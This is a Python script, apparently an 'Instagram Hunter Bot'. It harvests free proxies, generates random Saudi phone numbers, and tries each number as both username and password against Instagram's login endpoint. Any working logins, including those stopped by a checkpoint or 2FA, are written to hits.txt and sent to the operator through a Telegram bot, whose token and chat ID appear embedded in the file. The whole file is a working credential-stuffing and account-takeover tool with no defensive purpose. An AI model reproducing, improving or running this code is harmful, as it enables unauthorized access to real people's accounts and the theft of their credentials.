# hunter_bot_unified.py - v1.2 (with Telegram Notifications)
# All-in-one version of the Instagram Hunter Bot.

import requests
from bs4 import BeautifulSoup
import threading
import queue
import time
import random
from datetime import datetime

# ==============================================================================
# SECTION 0: TELEGRAM NOTIFICATION LOGIC
# ==============================================================================

# --- أدخل بياناتك هنا ---
TELEGRAM_BOT_TOKEN = "1936058114:AAHm19u1R6lv_vShGio-MIo4Z0rjVUoew_U"  # استبدل هذا بالتوكن الخاص ببوتك
TELEGRAM_CHAT_ID = "1148797883"      # استبدل هذا بالـ ID الخاص بحسابك

def send_telegram_notification(message):
    """Sends a message to your Telegram account."""
    if not TELEGRAM_BOT_TOKEN or not TELEGRAM_CHAT_ID:
        print("[TELEGRAM_WARNING] Token or Chat ID is not set. Skipping notification.")
        return
        
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': TELEGRAM_CHAT_ID,
        'text': message,
        'parse_mode': 'Markdown'
    }
    try:
        requests.post(url, json=payload, timeout=5)
        print(f"[TELEGRAM] Notification sent successfully!")
    except Exception as e:
        print(f"[TELEGRAM_ERROR] Failed to send notification: {e}")


# ==============================================================================
# SECTION 1: PROXY HARVESTER LOGIC
# ==============================================================================

PROXY_SOURCE_URL = "https://free-proxy-list.net/"
CHECK_URL = "https://httpbin.org/ip"
CHECK_TIMEOUT = 7
MAX_CHECKER_THREADS = 100

def _check_proxy(q, live_proxies_list):
    """Worker function for checking a single proxy."""
    while not q.empty():
        proxy = q.get()
        proxies_dict = {"http": proxy, "https": proxy}
        try:
            response = requests.get(CHECK_URL, proxies=proxies_dict, timeout=CHECK_TIMEOUT)
            if response.status_code == 200:
                # print(f"[LIVE] Found working proxy: {proxy}") # يمكن إلغاء التعليق لرؤية كل بروكسي صالح
                live_proxies_list.append(proxy)
        except Exception:
            pass
        q.task_done()

def run_harvester():
    """Scrapes and checks proxies, returns a list of live ones."""
    print("="*50)
    print("[HARVESTER] Starting to scrape for new proxies...")
    
    proxies_to_check_queue = queue.Queue()
    live_proxies_list = []

    try:
        response = requests.get(PROXY_SOURCE_URL, timeout=15)
        soup = BeautifulSoup(response.content, 'html.parser')
        proxy_table = soup.find("table", class_="table-striped")
        
        count = 0
        for row in proxy_table.tbody.find_all("tr"):
            ip, port, _, _, _, _, is_https, _ = [td.string for td in row.find_all("td")]
            if is_https == 'yes':
                proxy = f"http://{ip}:{port}"
                proxies_to_check_queue.put(proxy)
                count += 1
        
        if count == 0:
            print("[HARVESTER_ERROR] No HTTPS proxies were found.")
            return []

        print(f"[HARVESTER] Scraped {count} HTTPS proxies. Now starting the check...")
        
        threads = []
        for _ in range(MAX_CHECKER_THREADS):
            thread = threading.Thread(target=_check_proxy, args=(proxies_to_check_queue, live_proxies_list))
            thread.start()
            threads.append(thread)

        proxies_to_check_queue.join()
        for thread in threads:
            thread.join()

        print(f"[HARVESTER_COMPLETE] Found {len(live_proxies_list)} live proxies.")
        print("="*50)
        return live_proxies_list

    except Exception as e:
        print(f"[HARVESTER_ERROR] Could not run harvester: {e}")
        return []

# ==============================================================================
# SECTION 2: INSTAGRAM LOGIC
# ==============================================================================

def attempt_login(username, password, proxy):
    """Performs a single Instagram login attempt using a proxy."""
    login_url = 'https://www.instagram.com/accounts/login/ajax/'
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "X-Requested-With": "XMLHttpRequest",
        "Referer": "https://www.instagram.com/accounts/login/",
    }
    proxies_dict = {"http": proxy, "https": proxy}
    
    try:
        with requests.Session() as s:
            response = s.get("https://www.instagram.com/accounts/login/", proxies=proxies_dict, timeout=10)
            csrf_token = response.cookies.get('csrftoken')
            if not csrf_token: return "FAIL"

            headers['x-csrftoken'] = csrf_token
            current_time = int(datetime.now().timestamp())
            payload = {
                'username': username,
                'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{current_time}:{password}',
                'queryParams': {}, 'optIntoOneTap': 'false'
            }

            login_response = s.post(login_url, data=payload, headers=headers, proxies=proxies_dict, timeout=10)
            
            if login_response.status_code != 200: return "FAIL"
            data = login_response.json()

            if data.get("authenticated"): return "SUCCESS"
            if "checkpoint_url" in login_response.text: return "CHECKPOINT"
            if data.get("two_factor_required"): return "2FA"
            return "FAIL"
    except Exception:
        return "FAIL"

# ==============================================================================
# SECTION 3: MAIN CONTROLLER
# ==============================================================================

# --- Configuration ---
COUNTRY_CODE = "966"
OPERATOR_CODES = ["50", "55", "53", "54", "56", "58", "59"]
NUMBER_LENGTH = 7
MAX_HUNTING_THREADS = 25
HITS_FILE = "hits.txt"

def generate_phone_numbers():
    """Generates a list of phone numbers to test."""
    print("[GENERATOR] Generating phone numbers...")
    numbers = []
    for op_code in OPERATOR_CODES:
        for _ in range(200): # Generate 200 random numbers per operator
            random_digits = ''.join(random.choice('0123456789') for _ in range(NUMBER_LENGTH))
            full_number = f"{COUNTRY_CODE}{op_code}{random_digits}"
            numbers.append(full_number)
    random.shuffle(numbers)
    print(f"[GENERATOR] Generated {len(numbers)} numbers for the hunt.")
    return numbers

def hunter_thread(username, password, proxy_list):
    """A thread that performs one hunt attempt."""
    if not proxy_list: return
    proxy = random.choice(proxy_list)
    
    # print(f"[*] Attempting -> {username} with proxy {proxy}") # يمكن إلغاء التعليق لرؤية كل محاولة
    status = attempt_login(username, password, proxy)
    
    if status != "FAIL":
        result_message = f"🎯 *HIT FOUND!* 🎯\n\n*Status:* `{status}`\n*Username:* `{username}`\n*Password:* `{password}`"
        print(result_message)
        
        # *** إرسال الإشعار إلى تيليجرام ***
        send_telegram_notification(result_message)
        
        with open(HITS_FILE, "a") as f:
            f.write(f"{username}:{password} | Status: {status}\n")

def main():
    """The main entry point of the bot."""
    start_message = "🚀 *Instagram Hunter Bot v1.2 Started!* 🚀\n\nI will notify you here if I find any hits."
    print(start_message)
    send_telegram_notification(start_message)
    
    live_proxies = run_harvester()
    if not live_proxies:
        error_message = "❌ *Hunt Stopped!* ❌\n\nCould not find any live proxies. Please check the server or try again later."
        print(error_message)
        send_telegram_notification(error_message)
        return

    targets = generate_phone_numbers()
    
    print("\n[HUNT] Starting the hunt... Good luck!")
    threads = []
    for target_number in targets:
        username = password = target_number
        
        t = threading.Thread(target=hunter_thread, args=(username, password, live_proxies))
        threads.append(t)
        t.start()
        
        if len(threads) >= MAX_HUNTING_THREADS:
            for t in threads: t.join()
            threads = []
            time.sleep(1)

    for t in threads: t.join()

    end_message = "✅ *Hunt Finished!* ✅\n\nCheck the server logs and the `hits.txt` file for full results."
    print(end_message)
    send_telegram_notification(end_message)

if __name__ == "__main__":
    main()
